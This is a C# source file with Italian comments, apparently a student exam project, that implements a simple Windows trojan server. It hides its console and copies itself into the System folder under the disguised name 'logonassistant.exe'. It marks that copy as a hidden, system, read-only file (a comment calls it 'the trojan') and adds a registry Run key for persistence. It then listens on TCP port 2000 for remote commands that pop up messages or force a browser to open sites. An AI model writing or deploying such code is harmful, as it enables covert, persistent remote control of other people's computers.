using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace esameServer
{
    class Program
    {
        public static NetworkStream Receiver;

        [DllImport("kernel32.dll")]

        public static extern bool FreeConsole();

        public static void Receive()//metodo che prova a leggere i dati mandati
        {
            //Infinite loop
            while (true)
            {
                //Try to read the data.
                try
                {
                    //pacchetto dati ricevuti
                    byte[] RecPacket = new byte[1000];

                    //leggo comando
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    Receiver.Flush();

                    //converto il pacchetto in una stringa leggibile
                    string Command = Encoding.ASCII.GetString(RecPacket);

                    //divido il comando con la stringa decisa !!!---
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "!!!---");

                    //prendo il comando corrente
                    Command = CommandArray[0];

                    //switch per i due comandi
                    switch (Command)
                    {
                        //codice che manda il messaggio
                        case "MESSAGE":

                            //ottengo il messaggio
                            string Msg = CommandArray[1];

                            //mostro il messaggio
                            System.Windows.Forms.MessageBox.Show(Msg.Trim('\0'));

                            break;

                        case "OPENSITE"://comando per forzare l'apertura di un sito

                            //prendo l'url
                            string Site = CommandArray[1];
                            //apro con Explorer
                            System.Diagnostics.Process IE = new System.Diagnostics.Process();

                            IE.StartInfo.FileName = "iexplore.exe";
                            IE.StartInfo.Arguments = Site.Trim('\0');
                            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                            IE.Start();

                            break;
                    }

                }
                catch
                {
                    break;
                }

            }
        }

        public static bool CheckIfRan()
        {
            bool IsRan = false;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"))
            {
                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                if (k.GetValue("logonassist") != null)
                {
                    IsRan = true;
                }
                else
                {
                    IsRan = false;
                }
            }
            return IsRan;
        }

        //metodo rimosso
        public static void AddToStartup()
        {
            try
            {
                File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"), true);
                //Makes the trojan a hidden, read-only, system file :-)
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.Hidden);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.System);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);

                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", RegistryValueKind.String);
                k.Close();
            }

            catch{}
        }
        static void Main(string[] args)
        {
            //nascondo la console
            FreeConsole();

            //controllo se il programma è partito
            bool Check = CheckIfRan();

            //se non partito
            if (!Check)
            {
                AddToStartup();//metodo rimosso

                //ascolto la connessione del client
                TcpListener l = new TcpListener(2000);
                l.Start();

                //accetto la connessione
                TcpClient Connection = l.AcceptTcpClient();

                Receiver = Connection.GetStream();

                //inizio il thread che riceve i comandi
                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Receive));
                Rec.Start();
            }

        }
    }
}
